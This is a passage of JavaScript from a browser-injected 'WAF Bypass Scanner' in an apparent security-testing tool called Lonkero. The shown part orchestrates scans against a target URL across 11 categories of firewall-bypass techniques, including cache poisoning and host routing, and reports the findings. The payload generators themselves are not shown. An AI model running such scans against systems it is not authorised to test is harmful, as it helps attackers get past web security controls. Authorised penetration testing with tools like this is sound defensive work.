  }

  /**
   * Main scan function - runs ALL WAF bypass techniques against the current URL.
   */
  async function scan(targetUrl) {
    const url = targetUrl || location.href;
    _cancelled = false;
    findings.length = 0;
    _progress = { total: 0, done: 0, bypasses: 0, category: 'initializing' };

    console.log(`[WAF Bypass] Starting comprehensive scan on ${url}`);
    console.log(`[WAF Bypass] Derived from waf_insane.py (150 tests), waf_seam.py (35 tests), waf_chaos.py (35 tests)`);

    const parsed = parsePath(url);
    if (!parsed) {
      return { error: 'Invalid URL', url, findings: [] };
    }

    // Establish baseline
    updateProgress('baseline', 0, 1);
    const baseline = await tryFetch(url);
    const blockType = isBlocked(baseline.status, baseline.bodySnippet);
    baseline._blockType = blockType;

    if (!blockType) {
      console.log(`[WAF Bypass] URL returns ${baseline.status}, not blocked. Testing anyway with relaxed detection...`);
      // Even if not blocked, we can still test for WAF presence by checking
      // if any request gets a different (potentially blocked) response
      baseline._blockType = 'probe';
    }

    const statusDesc = blockType === 'hard' ? `${baseline.status} (hard block)`
      : blockType === 'waf' ? `${baseline.status} (WAF block page)`
      : blockType === 'soft' ? `${baseline.status} (SPA soft-block)`
      : `${baseline.status} (testing for WAF presence)`;

    console.log(`[WAF Bypass] Baseline: ${statusDesc}, body size: ${baseline.bodyLength}`);

    // If it's a "probe" mode (not blocked), adjust bypass detection
    if (baseline._blockType === 'probe') {
      // In probe mode, we look for responses where the WAF blocks our attack payloads
      // differently, indicating WAF presence + potential bypass paths
    }

    // Generate all test categories
    const pathTests = generatePathNormalization(parsed.path);
    const encodingTests = generateEncodingBypass(parsed.path);
    const headerTests = generateHeaderBypasses();
    const methodTests = generateMethodConfusion();
    const hostTests = generateHostRouting(parsed.host);
    const cacheTests = generateCachePoisoning(parsed.path);
    const ctTests = generateContentTypeConfusion();
    const seamTests = generateArchitectureSeams(parsed.path, parsed.host);
    const chaosTests = generateEngineChaos(parsed.path);
    const wellKnownTests = generateWellKnownPaths(parsed.path);
    const refererTests = generateRefererBypasses(parsed.origin);

    const totalTests = pathTests.length + encodingTests.length + headerTests.length +
      methodTests.length + hostTests.length + cacheTests.length + ctTests.length +
      seamTests.length + chaosTests.length + wellKnownTests.length + refererTests.length;

    _progress.total = totalTests;
    console.log(`[WAF Bypass] Running ${totalTests} tests across 11 categories...`);

    const allFindings = [];

    // Run categories sequentially to avoid overwhelming the target
    const categories = [
      ['Path Normalization', pathTests],
      ['Encoding Bypass', encodingTests],
      ['Header Bypass', headerTests],
      ['Method Confusion', methodTests],
      ['Host Routing', hostTests],
      ['Cache Poisoning', cacheTests],
      ['Content-Type Confusion', ctTests],
      ['Architecture Seam', seamTests],
      ['Engine Chaos', chaosTests],
      ['Well-Known Path Abuse', wellKnownTests],
      ['Referer/Origin Bypass', refererTests],
    ];

    for (const [catName, tests] of categories) {
      if (_cancelled) break;
      console.log(`[WAF Bypass] Running: ${catName} (${tests.length} tests)`);
      const catFindings = await runCategory(catName, tests, url, baseline, parsed);
      allFindings.push(...catFindings);
      console.log(`[WAF Bypass]   ${catName}: ${catFindings.length} bypasses found`);
    }

    // Build report
    const report = {
      url,
      originalStatus: statusDesc,
      baseline: {
        status: baseline.status,
        bodyLength: baseline.bodyLength,
        server: baseline.server,
        cfRay: baseline.cfRay,
        blockType: blockType || 'none',
      },
      totalTests,
      findings: allFindings,
      findingCount: allFindings.length,
      cancelled: _cancelled,
      summary: {
        total: totalTests,
        bypasses: allFindings.length,
        categories: {},
      },
    };

    // Category breakdown
    for (const [catName] of categories) {
      const catFindings = allFindings.filter(f => f.category === catName);
      report.summary.categories[catName] = {
        bypasses: catFindings.length,
        critical: catFindings.filter(f => f.severity === 'critical').length,
        high: catFindings.filter(f => f.severity === 'high').length,
      };
    }

    console.log(`[WAF Bypass] Scan complete. ${allFindings.length} bypasses found across ${totalTests} tests.`);

    // Dispatch completion event
    window.postMessage({
      type: '__lonkero_waf_bypass_complete__',
      _n: _wn, _ch: _we,
      report,
    }, '*');

    return report;
  }

  /**
   * Cancel a running scan.
   */
  function cancel() {
    _cancelled = true;
    console.log('[WAF Bypass] Scan cancelled.');
  }

  // ============================================
  // PUBLIC API
  // ============================================

  if (!window.wafBypass) Object.defineProperty(window, 'wafBypass', { value: {
    scan,
    cancel,
    getFindings: () => [...findings],
    getProgress: () => ({ ..._progress }),
    clearFindings: () => { findings.length = 0; },
  }, configurable: false, enumerable: false });

  // Listen for scan requests
  window.addEventListener('message', (event) => {
    if (event.source !== window) return;
    if (!_we || event.data?._ch !== _we || event.data?._n !== _wn) return;
    if (event.data?.type === '__lonkero_run_waf_bypass__') {
      scan(event.data.url);
    }
    if (event.data?.type === '__lonkero_cancel_waf_bypass__') {
      cancel();
    }
  });

  console.log('[Lonkero] WAF Bypass Scanner v1.0 loaded. 220+ techniques from waf_insane/waf_seam/waf_chaos. Use wafBypass.scan()');
})();
